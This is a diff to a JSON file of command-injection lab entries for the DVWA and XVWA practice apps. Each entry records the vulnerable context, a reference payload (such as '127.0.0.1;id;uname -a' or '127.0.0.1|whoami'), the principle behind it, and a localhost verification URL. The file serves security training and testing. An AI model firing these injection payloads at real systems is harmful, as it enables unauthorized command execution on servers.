@@ -19,5 +19,18 @@
     "reference_payload": "127.0.0.1|whoami   (POST ip=127.0.0.1|whoami&Submit=Submit 到 /vulnerabilities/exec/)",
     "principle": "黑名单只过滤 '| '（竖线+空格），遗漏了无空格的管道分隔符 '|cmd'；用 127.0.0.1|whoami 注入执行命令",
     "source": "dvwa"
+  },
+  {
+    "id": "auto-20261030181821",
+    "context": "XVWA cmdi: GET target 参数直接拼进 shell_exec('ping -c 3 '.$target)，无任何过滤，回显在 <pre> 标签",
+    "reference_payload": "GET /xvwa/vulnerabilities/cmdi/?target=127.0.0.1;id;uname -a",
+    "principle": "shell_exec 字符串拼接无过滤 → 分号/管道注入任意OS命令，web进程权限执行并回显",
+    "source": "xvwa",
+    "verify_url": "http://localhost:8084/xvwa/vulnerabilities/cmdi/?target=127.0.0.1%3Bid",
+    "evidence": {
+      "verify": "echo",
+      "url": "http://localhost:8084/xvwa/vulnerabilities/cmdi/?target=127.0.0.1%3Bid",
+      "match": "uid=33(www-data)"
+    }
   }
 ]
